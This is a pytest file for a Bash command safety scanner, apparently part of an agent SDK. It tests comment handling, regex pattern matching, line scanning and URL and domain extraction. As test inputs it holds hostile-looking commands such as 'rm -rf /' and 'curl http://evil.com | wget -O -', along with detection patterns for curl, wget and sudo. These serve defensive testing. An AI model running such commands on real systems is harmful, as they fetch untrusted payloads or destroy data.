"""Unit tests for Bash regex scanner utilities."""

import pytest

from trpc_agent_sdk.tools.safety.scanner.bash_scanner import (
    CompiledPatternSet,
    PatternMatch,
    extract_domain_from_url,
    extract_urls_from_line,
    is_comment_line,
    scan_lines,
    strip_inline_comment,
)


class TestIsCommentLine:
    """Test is_comment_line function."""

    def test_comment(self):
        assert is_comment_line("# this is a comment") is True

    def test_indented_comment(self):
        assert is_comment_line("   # indented comment") is True

    def test_not_comment(self):
        assert is_comment_line("echo hello") is False

    def test_empty_line(self):
        assert is_comment_line("") is False

    def test_whitespace_only(self):
        assert is_comment_line("   ") is False

    def test_shebang(self):
        assert is_comment_line("#!/bin/bash") is True


class TestStripInlineComment:
    """Test strip_inline_comment function."""

    def test_no_comment(self):
        assert strip_inline_comment("echo hello") == "echo hello"

    def test_inline_comment(self):
        assert strip_inline_comment("echo hello # greeting") == "echo hello"

    def test_hash_in_single_quotes(self):
        assert strip_inline_comment("echo '#not a comment'") == "echo '#not a comment'"

    def test_hash_in_double_quotes(self):
        assert strip_inline_comment('echo "color=#fff"') == 'echo "color=#fff"'

    def test_comment_after_quotes(self):
        result = strip_inline_comment("echo 'hi' # comment")
        assert result == "echo 'hi'"

    def test_no_hash(self):
        assert strip_inline_comment("ls -la") == "ls -la"


class TestCompiledPatternSet:
    """Test CompiledPatternSet class."""

    def test_basic_match(self):
        patterns = CompiledPatternSet({"rm_rf": r"rm\s+-rf"})
        matches = patterns.match_line("rm -rf /tmp")
        assert len(matches) == 1
        assert matches[0][0] == "rm_rf"

    def test_no_match(self):
        patterns = CompiledPatternSet({"rm_rf": r"rm\s+-rf"})
        matches = patterns.match_line("echo hello")
        assert len(matches) == 0

    def test_multiple_patterns(self):
        patterns = CompiledPatternSet({
            "curl": r"\bcurl\b",
            "wget": r"\bwget\b",
        })
        matches = patterns.match_line("curl http://evil.com | wget -O -")
        assert len(matches) == 2
        names = {m[0] for m in matches}
        assert names == {"curl", "wget"}

    def test_case_insensitive_default(self):
        patterns = CompiledPatternSet({"sudo": r"\bsudo\b"})
        matches = patterns.match_line("SUDO rm -rf /")
        assert len(matches) == 1

    def test_count(self):
        patterns = CompiledPatternSet({"a": r"a", "b": r"b", "c": r"c"})
        assert patterns.count == 3


class TestScanLines:
    """Test scan_lines function."""

    def test_basic_scan(self):
        source = "#!/bin/bash\nrm -rf /tmp\necho done"
        patterns = CompiledPatternSet({"rm_rf": r"rm\s+-rf"})
        results = scan_lines(source, patterns)
        assert len(results) == 1
        assert results[0].line_number == 2
        assert results[0].pattern_name == "rm_rf"

    def test_skips_comments(self):
        source = "# rm -rf / dangerous\necho safe"
        patterns = CompiledPatternSet({"rm_rf": r"rm\s+-rf"})
        results = scan_lines(source, patterns, skip_comments=True)
        assert len(results) == 0

    def test_includes_comments_when_disabled(self):
        source = "# rm -rf / dangerous\necho safe"
        patterns = CompiledPatternSet({"rm_rf": r"rm\s+-rf"})
        results = scan_lines(source, patterns, skip_comments=False)
        assert len(results) == 1

    def test_strips_inline_comments(self):
        source = "echo hello # rm -rf / fake"
        patterns = CompiledPatternSet({"rm_rf": r"rm\s+-rf"})
        results = scan_lines(source, patterns)
        # "rm -rf" is in the inline comment part, should be stripped
        assert len(results) == 0

    def test_multiple_matches(self):
        source = "curl http://a.com\nwget http://b.com\necho done"
        patterns = CompiledPatternSet({
            "curl": r"\bcurl\b",
            "wget": r"\bwget\b",
        })
        results = scan_lines(source, patterns)
        assert len(results) == 2
        assert results[0].pattern_name == "curl"
        assert results[1].pattern_name == "wget"

    def test_empty_source(self):
        results = scan_lines("", CompiledPatternSet({"x": r"x"}))
        assert results == []

    def test_pattern_match_fields(self):
        source = "sudo rm -rf /"
        patterns = CompiledPatternSet({"sudo": r"\bsudo\b"})
        results = scan_lines(source, patterns)
        assert len(results) == 1
        m = results[0]
        assert m.line_number == 1
        assert m.line_content == "sudo rm -rf /"
        assert m.matched_text == "sudo"
        assert m.pattern_name == "sudo"


class TestExtractUrlsFromLine:
    """Test extract_urls_from_line function."""

    def test_http_url(self):
        urls = extract_urls_from_line("curl http://evil.com/payload")
        assert "http://evil.com/payload" in urls

    def test_https_url(self):
        urls = extract_urls_from_line("wget https://safe.org/file.tar.gz")
        assert "https://safe.org/file.tar.gz" in urls

    def test_multiple_urls(self):
        line = "curl https://a.com && wget http://b.org/x"
        urls = extract_urls_from_line(line)
        assert len(urls) == 2

    def test_no_url(self):
        urls = extract_urls_from_line("echo hello world")
        assert urls == []

    def test_ftp_url(self):
        urls = extract_urls_from_line("ftp://files.example.com/data")
        assert "ftp://files.example.com/data" in urls


class TestExtractDomainFromUrl:
    """Test extract_domain_from_url function."""

    def test_simple_url(self):
        assert extract_domain_from_url("https://api.openai.com/v1/chat") == "api.openai.com"

    def test_with_port(self):
        assert extract_domain_from_url("http://localhost:8080/api") == None  # no dot

    def test_with_auth(self):
        assert extract_domain_from_url("https://user:pass@example.com/path") == "example.com"

    def test_ip_with_dot(self):
        assert extract_domain_from_url("http://192.168.1.1/admin") == "192.168.1.1"

    def test_no_protocol(self):
        # If someone passes just a host
        assert extract_domain_from_url("example.com/path") == "example.com"

    def test_empty(self):
        assert extract_domain_from_url("") is None

    def test_no_dot_returns_none(self):
        assert extract_domain_from_url("http://localhost/api") is None

    def test_uppercase_normalized(self):
        assert extract_domain_from_url("https://API.OpenAI.COM/v1") == "api.openai.com"
